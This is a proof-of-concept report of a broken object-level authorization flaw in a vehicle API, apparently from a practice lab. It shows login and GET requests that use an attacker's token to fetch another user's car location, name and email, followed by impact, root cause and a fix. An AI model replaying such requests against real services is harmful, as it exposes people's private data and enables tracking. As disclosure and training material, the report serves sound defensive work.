# Broken Object Level Authorization (BOLA) - Proof of Concept

## Summary

The API fails to enforce object-level authorization on the `vehicle` resource. An authenticated user can access another user's vehicle data by supplying a valid `carId`.

---

## Steps to Reproduce

### 1. Authenticate as Attacker

Send the following request:

```http
POST /identity/api/auth/login HTTP/1.1
Host: pentest.lab:8888
Content-Type: application/json

{
  "email": "attacker@mail.com",
  "password": "Password123!"
}
```

Extract the token from the response:

```
attacker_token = eyJhbGciOiJSUzI1NiJ9...
```

---

### 2. Identify Victim's `carId`

Example victim `carId`:

```
ab8e549c-94e4-4aba-b0b8-0957ff8d6e62
```

---

### 3. Access Victim Resource Using Attacker Token

```http
GET /identity/api/v2/vehicle/ab8e549c-94e4-4aba-b0b8-0957ff8d6e62/location HTTP/1.1
Host: pentest.lab:8888
Authorization: Bearer eyJhbGciOiJSUzI1NiJ9...attacker_token
Accept: application/json
```

---

## Actual Result (Unauthorized Access)

```json
{
  "carId": "ab8e549c-94e4-4aba-b0b8-0957ff8d6e62",
  "vehicleLocation": {
    "id": 5,
    "latitude": "37.406769",
    "longitude": "-94.705528"
  },
  "fullName": "Chukwunonso Jude Aneke",
  "email": "nonsoaneke@mail.com"
}
```

---

## Expected Result

The API should return:

```http
HTTP/1.1 403 Forbidden
```

Or:

```json
{
  "error": "Unauthorized access to this resource"
}
```

---

## Impact

* Unauthorized access to sensitive user data
* Exposure of real-time vehicle location
* User tracking risk
* Horizontal privilege escalation

---

## Root Cause

The application does not validate that the authenticated user owns or is authorized to access the requested `carId`.

---

## Recommendation

Implement strict object-level authorization checks:

```python
vehicle = get_vehicle(carId)

if vehicle.owner_email != jwt.sub:
    return 403 Forbidden
```

Additionally:

* Avoid relying solely on user-supplied identifiers
* Enforce ownership checks at every resource access layer

---

## Severity

High
